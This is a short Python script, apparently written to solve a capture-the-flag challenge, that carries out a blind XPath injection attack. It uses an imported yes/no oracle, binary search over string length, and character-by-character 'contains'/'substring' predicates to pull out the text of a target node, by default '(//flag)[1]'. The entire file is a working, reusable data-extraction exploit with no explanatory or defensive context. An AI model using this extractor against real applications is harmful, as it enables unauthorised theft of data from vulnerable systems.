import string, sys
from xp import ask

ALPHA = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}_-!@#$%^&*()+=:;,.?/[]<>|~`' "

def test(pred):
    return ask(pred)[0]

def extract(node='(//flag)[1]', maxlen=200):
    lo, hi = 0, maxlen
    # find length by doubling
    n = 1
    while n < maxlen and test('string-length(%s) > %d' % (node, n)):
        n *= 2
    lo, hi = 1, n
    while lo < hi:
        mid = (lo + hi) // 2
        if test('string-length(%s) > %d' % (node, mid)):
            lo = mid + 1
        else:
            hi = mid
    length = lo
    print('length', length, flush=True)
    out = ''
    for pos in range(1, length + 1):
        a, b = 0, len(ALPHA) - 1
        while a < b:
            mid = (a + b) // 2
            hay = ALPHA[a:mid+1]
            pred = 'contains("%s", substring(%s, %d, 1))' % (hay, node, pos)
            if test(pred):
                b = mid
            else:
                a = mid + 1
        out += ALPHA[a]
        print(''.join(out), flush=True)
    return out

if __name__ == '__main__':
    node = sys.argv[1] if len(sys.argv) > 1 else '(//flag)[1]'
    print('RESULT:', extract(node))
